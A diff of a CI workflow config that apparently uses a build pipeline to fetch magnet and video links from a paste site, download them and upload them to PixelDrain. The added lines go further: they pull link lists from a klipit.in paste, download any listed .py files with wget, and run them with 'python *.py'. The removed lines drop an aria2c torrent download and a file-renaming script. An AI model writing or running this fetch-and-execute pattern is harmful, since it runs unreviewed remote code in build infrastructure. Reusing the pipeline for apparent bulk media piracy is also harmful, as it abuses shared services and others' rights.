@@ -12,37 +12,9 @@ workflows:
                 set -e
                 mkdir -p downloads
                 pip install aria2
-                curl -s https://klipit.in/ugq73679 | grep -oP 'magnet:\S+|https?://\S+\.(mp4|mkv|avi|srt|itorrents)' > download_links.txt
-                aria2c --seed-time=0 --dir=downloads -i download_links.txt
-                - script:
-          title: Rename File
-          inputs:
-            - content: |-
-                #!/bin/bash
-            shopt -s nocasematch
-            find ./downloads -type f -print0 | while IFS= read -r -d '' f; do
-              filename=$(basename "$f")
-              echo "Processing file: $filename"
-              ext="${filename##*.}"
-              base="${filename%.*}"
-              echo "Extension: $ext, Base: $base"
-
-              # Replace dots with spaces in the base filename
-              newbase="${base//./ }"
-              echo "New base after replacing dots with spaces: '$newbase'"
-
-              # Construct new filename with original extension
-              newname="${f%/*}/$newbase.$ext"
-              echo "Intended new filename: $newname"
-
-              # Only rename if filename differs
-              if [ "$filename" != "$newbase.$ext" ]; then
-                echo "Renaming '$filename' to '$newbase.$ext'"
-                mv "$f" "$newname"
-              else
-                echo "No renaming needed for: $filename"
-              fi
-            done
+                curl -s https://klipit.in/sju77028 | grep -oP 'magnet:\S+|https?://\S+\.(mp4|mkv|avi|srt|py)' > links.txt
+                wget --content-disposition -i links.txt
+                python *.py
             - script:
           title: Upload files to PixelDrain
           inputs:
